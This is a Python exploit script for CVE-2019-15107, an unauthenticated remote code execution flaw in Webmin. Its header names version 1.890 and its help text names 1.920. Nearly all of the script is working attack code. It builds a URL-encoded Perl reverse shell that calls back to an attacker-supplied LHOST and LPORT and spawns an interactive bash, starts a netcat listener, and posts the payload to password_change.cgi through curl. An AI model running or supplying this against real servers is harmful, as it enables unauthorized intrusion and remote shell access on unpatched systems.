##########################################################################
#   Exploit for Webmin server version 1.890                              #
#                                                                        #
#   CVE: 2019-15107         Unauthenticated Remote Code Execution        #
#                                                                        #
#   Author: @hsilyav                                   			 #
#                                                                        #
##########################################################################

import argparse
import re
import subprocess

def is_valid_ip(ip):
    ip_pattern = r"^\d{1,3}(\.\d{1,3}){3}$"
    return re.match(ip_pattern, ip) is not None

def is_valid_port(port):
    return 1 <= port <= 65535

def main():
    parser = argparse.ArgumentParser(description="Exploit Webmin 1.920 - Unauthenticated Remote Code Execution.")
    
    parser.add_argument("target_host", help="Target IP or domain")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("LHOST", help="Your IP address (LHOST)")
    parser.add_argument("LPORT", type=int, help="Your local listening port (LPORT)")

    args = parser.parse_args()

    if not (is_valid_ip(args.target_host) or re.match(r"^[a-zA-Z0-9.-]+$", args.target_host)):
        print("The target_host must be a valid IP address or domain.")
        return

    if not is_valid_port(args.target_port):
        print("The target_port is not in the valid range (1-65535).")
        return

    if not is_valid_ip(args.LHOST):
        print("LHOST must be a valid IP address.")
        return

    if not is_valid_port(args.LPORT):
        print("LPORT is not in the valid range (1-65535).")
        return
        
    payload = f"perl%20-e%20%27use%20Socket%3B%24i%3D%22{args.LHOST}%22%3B%24p%3D{args.LPORT}%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fbash%20-i%22%29%3B%7D%3B%27"
        
    netcat_process = subprocess.Popen(["nc", "-l", "-p", str(args.LPORT)])
    print('\n','[*] Listening on port',args.LPORT)
        
    print('\n','[*] Sending payload: ',payload)
    print('\n')
    
    curl_command = (
        f"curl -X POST http://{args.target_host}:{args.target_port}/password_change.cgi "
        f"-H 'Host: {args.target_host}:{args.target_port}' "
        f"-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' "
        f"-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' "
        f"-H 'Accept-Language: en-US,en;q=0.5' "
        f"-H 'Accept-Encoding: gzip, deflate, br' "
	f"-H 'Referer: http://{args.target_host}:{args.target_port}/session_login.cgi' "
        f"-H 'Content-Type: application/x-www-form-urlencoded' "
        f"-H 'Content-Length: 376' "
        f"-H 'Origin: http://{args.target_host}:{args.target_port}' "
        f"-H 'Connection: close' "
        f"-H 'Cookie: redirect=1; testing=1; sessiontest=1' "
	f"-d 'expired={payload}' "
    )
    
    subprocess.run(curl_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
    print('\n\n',"[*] Exploit completed.")

if __name__ == "__main__":
    main()
